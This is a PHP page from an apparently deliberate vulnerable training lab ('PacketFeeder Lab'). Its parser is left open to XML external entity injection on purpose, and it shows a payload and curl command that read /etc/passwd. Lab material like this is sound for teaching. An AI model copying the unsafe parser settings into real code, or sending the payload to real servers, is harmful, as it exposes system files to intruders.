<?php
require_once __DIR__ . '/db.php';
require_login();

$result = '';
$raw = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw = file_get_contents('php://input');
    if ($raw) {
        // Intentionally vulnerable: LIBXML_NOENT enables external entity substitution
        libxml_disable_entity_loader(false);
        $xml = simplexml_load_string($raw, 'SimpleXMLElement', LIBXML_NOENT);
        if ($xml === false) {
            $result = "XML Parse Error:\n";
            foreach (libxml_get_errors() as $err) {
                $result .= $err->message;
            }
        } else {
            $result = $xml->asXML();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XXE Injection — PacketFeeder Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <nav>
        <span class="brand">PacketFeeder Lab</span>
        <span class="links">
            <a href="dashboard.php">Dashboard</a>
            <a href="logout.php">Logout</a>
        </span>
    </nav>
    <div class="container">
        <div class="module-banner">
            <h1>XXE Injection</h1>
            <p class="mitre">T1059 — Command and Scripting Interpreter | CWE-611 — Improper Restriction of XML External Entity Reference</p>
        </div>

        <p class="info">Send a POST request with raw XML body. Use curl or the form below.</p>

        <div class="example">
            <strong>Example — Normal XML:</strong><br>
            <code>&lt;user&gt;&lt;name&gt;test&lt;/name&gt;&lt;/user&gt;</code>
        </div>

        <div class="example">
            <strong>Example — XXE payload (file read):</strong><br>
<pre>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</pre>
        </div>

        <div class="example">
            <strong>curl command:</strong><br>
<pre>curl -X POST -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;' \
  -b 'PHPSESSID=YOUR_SESSION' \
  http://TARGET/xxe.php</pre>
        </div>

        <!-- Simple form for browser-based testing -->
        <form id="xxe-form">
            <label>XML Payload</label>
            <textarea id="xml-input" rows="8">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</textarea>
            <button type="submit">Send XML</button>
        </form>

        <pre class="result" id="xxe-result"><?= htmlspecialchars($result) ?></pre>

        <script>
        document.getElementById('xxe-form').addEventListener('submit', function(e) {
            e.preventDefault();
            var xml = document.getElementById('xml-input').value;
            fetch('xxe.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/xml'},
                body: xml
            })
            .then(r => r.text())
            .then(html => {
                var tmp = document.createElement('div');
                tmp.innerHTML = html;
                var pre = tmp.querySelector('#xxe-result');
                document.getElementById('xxe-result').textContent = pre ? pre.textContent : 'No result';
            });
        });
        </script>
    </div>
</body>
</html>
